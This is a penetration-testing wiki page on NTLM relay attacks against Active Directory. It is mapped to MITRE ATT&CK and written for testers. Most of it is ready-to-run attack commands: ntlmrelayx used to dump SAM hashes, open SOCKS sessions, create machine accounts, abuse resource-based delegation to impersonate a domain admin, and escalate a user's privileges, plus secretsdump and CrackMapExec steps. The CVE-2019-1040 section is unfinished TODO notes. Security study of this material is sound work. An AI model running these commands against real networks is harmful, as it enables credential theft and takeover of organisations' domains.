---
description: MITRE ATT&CK™ Sub-technique T1557.001
---

# Relay

## Theory

After successfully [forcing a victim to authenticate](../forced-authentications/) with LM or NTLM to an attacker's server, the attacker can try to relay that authentication to targets of his choosing. Depending on the mitigations in place, he will be able to move laterally and escalate privileges within an Active Directory domain.

## Practice

The NTLM authentication messages are embedded in the packets of application protocols such as SMB, HTTP, MSSQL, SMTP, IMAP. The LM and NTLM authentication protocols are "application protocol-independent". It means one can relay LM or NTLM authentication messages over a certain protocol, say HTTP, over another, say SMB. That is called **cross-protocols LM/NTLM relay**. It also means the relays and attacks possible depend on the application protocol the authentication messages are embedded in.

[ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) \(Python\), [MultiRelay](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py) \(Python\) and [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) \(Powershell\) are great tools for relaying NTLM authentications. Those tools setup relay clients and relay servers waiting for incoming authentications. Once the servers are up and ready, the tester can initiate a [forced authentication attack](../forced-authentications/).

{% hint style="warning" %}
When combining NTLM relay with Responder for [name poisoning](../forced-authentications/#llmnr-nbt-ns-mdns-name-poisoning), testers need to make sure that Responder's servers are deactivated, otherwise they will interfere with ntlmrelayx ones.

```text
sed -i 's/SMB = On/SMB = Off/g' /PATH/TO/Responder/Responder.conf
sed -i 's/HTTP = On/HTTP = Off/g' /PATH/TO/Responder/Responder.conf
```
{% endhint %}

Below are different use-cases of ntlmrelayx. The last "**+**" tab lists other interesting features that make this tool a must-have when attacking AD domains.

{% tabs %}
{% tab title="Creds dump" %}
The following command will try to relay the authentication over SMB and attempt to dump the hashes from the remote target’s SAM if the relayed victim has the right privileges.

```bash
ntlmrelayx.py -t smb://$TARGET
```
{% endtab %}

{% tab title="SOCKS session" %}
The following command will try to relay the authentication and open a SOCKS proxy.

```bash
ntlmrelayx.py -tf targets.txt -socks
```

The attacker will be able to use some tools along with proxychains to operate attack through the relayed authenticated session. In this case, secretsdump can be used to dump hashes from the remote target's [SAM and LSA secrets](../credentials/dumping/sam-and-lsa-secrets.md).

```bash
proxychains secretsdump.py -no-pass $DOMAIN/$USER@$TARGET
```
{% endtab %}

{% tab title="Domain dump" %}
The following command will run an enumeration of the Active Directory domain through the relayed authenticated session. The operation will create multiple `.html`, `.json` and `.grep` files.

```bash
ntlmrelayx.py -t ldap://$DC_TARGET
```
{% endtab %}

{% tab title="Account creation" %}
The following command will abuse the default value \(i.e. 10\) of `ms-DS-MachineAccountQuota` to create a domain machine account. The tester will then be able to use it for AD operations.

```bash
ntlmrelayx.py -t ldaps://$DC_TARGET --add-computer SHUTDOWN
```
{% endtab %}

{% tab title="Kerberos delegation" %}
The following command will [abuse Resource Based Kerberos Constrained Delegations \(RBCD\)](../abusing-kerberos/kerberos-delegations.md#resource-based-constrained-delegations-rbcd) to gain admin access to the relayed machine. The `--escalate-user` option must be supplied with a controlled machine account name. If no machine account is controlled, the `--add-computer` option can be supplied instead like the "Account creation" tab before, and by targeting LDAPS instead of LDAP.

```bash
ntlmrelayx.py -t ldaps://$DC_TARGET --escalate-user SHUTDOWN --delegate-access
```

If successful, the attacker will then be able to get a service ticket with the created domain machine account for the relayed victim and impersonate any account \(e.g. the domain admin\) on it.

```bash
getST.py -spn host/$RELAYED_VICTIM '$DOMAIN/$NEW_MACHINE_ACCOUNT$:$PASSWORD' -dc-ip $DOMAIN_CONTROLLER_IP -impersonate $USER_TO_IMPERSONATE
export KRB5CCNAME=$USER_TO_IMPERSONATE.ccache
secretsdump.py -k $RELAYED_VICTIM
```
{% endtab %}

{% tab title="Privesc" %}
The following command will try to relay the authentication over LDAPS and escalate the privileges of a domain user by adding it to a privileged group \(`--escalate-user`\) if the relayed account has sufficient privileges.

```bash
ntlmrelayx.py -t ldaps://$DOMAIN_CONTROLLER --escalate-user SHUTDOWN
```

{% hint style="info" %}
This technique is usually combined with a [PushSubscription abuse \(a.k.a. PrivExchange\)](../forced-authentications/#pushsubscription-abuse-a-k-a-privexchange) to force an Exchange server to initiate an authentication, relay it to a domain controller and abuse the default high privileges of Exchange servers in AD domains \(`WriteDACL` over domain object, see [Abusing ACEs](../abusing-aces/)\) to escalate a domain user privileges \(`--escalate-user`\).
{% endhint %}
{% endtab %}

{% tab title="+" %}
The ntlmrelayx tool offers other features making it a very valuable asset when pentesting an Active Directory domain:

* It can be combined with mitm6 \(for [DHCPv6 + DNS poisoning](../forced-authentications/#ipv6-dns-poisoning)\) by enabling IPv6 support with the `-6` option.
* It supports SMB2. It can be enabled with the `-smb2support` option.
* It implements [**CVE-2019-1040**](ntlm-relay.md#drop-the-mic-cve-2019-1040) with the `--remove-mic` option, usually needed when attempting "unsigning cross-protocols NTLM relay attacks" \(e.g. **SMB to SMB or LDAP/S\)**.
* It has the ability to attack multiple targets with the `-tf` option instead of `-t`, and the `-w` option can be set to watch the target file for changes and update target list automatically.
* It has the ability to dump domain info.
* It has the ability to relay connections for specific target users.
* It has the ability to relay a single connection \(SMB only for now\) to multiple targets.

{% hint style="info" %}
Thanks to [the recent "multi-relay" feature](https://www.secureauth.com/blog/what-old-new-again-relay-attack), another attacker machine/interface can be added to the targets to combine ntlmrelayx with Responder servers. The attackers will be able capture a ChallengeResponse \(i.e. LM or NTLM hash\) with a custom challenge on an interface/machine, while relaying on another.
{% endhint %}

The targets file used with the `-tf` option can contain the following

```bash
# User filter for SMB only (for now)
smb://DOMAIN\User@192.168.1.101
smb://User@192.168.1.101

# Domain name can be used instead of the IP address
ldaps://someserver.domain.lan
someserver.domain.lan
```

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) \(Python\) has the ability to generate the list of possible targets for relay to SMB \(hosts with SMB signing disabled\).

```bash
crackmapexec smb --gen-relay-list targets.txt $SUBNET
```
{% endtab %}
{% endtabs %}

### 🛠️ Drop The MIC \(CVE-2019-1040\)

//TODO : SMB to LDAP\(S\) or SMB to SMB-with-signing only, not needed when relaying HTTP to something else

//TODO : downgrade to SMBv1 to bypass signing negotiation and be able to relay without having to unsign for targets that don't enforce signing \(don't use -smb2support\)

//TODO : downgrade to lm/ntlmv1 to bypass other securities ? \(not implemented in impacket, and not even needed since it'd be better to capture and crack the ntlmv1 challengresponse\)

## References

{% embed url="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html" caption="" %}

{% embed url="https://en.hackndo.com/ntlm-relay/" caption="" %}

{% embed url="https://hunter2.gitbook.io/darthsidious/execution/responder-with-ntlm-relay-and-empire" caption="" %}

{% embed url="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/" caption="" %}

{% embed url="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/" caption="" %}

{% embed url="http://davenport.sourceforge.net/ntlm.html" caption="" %}

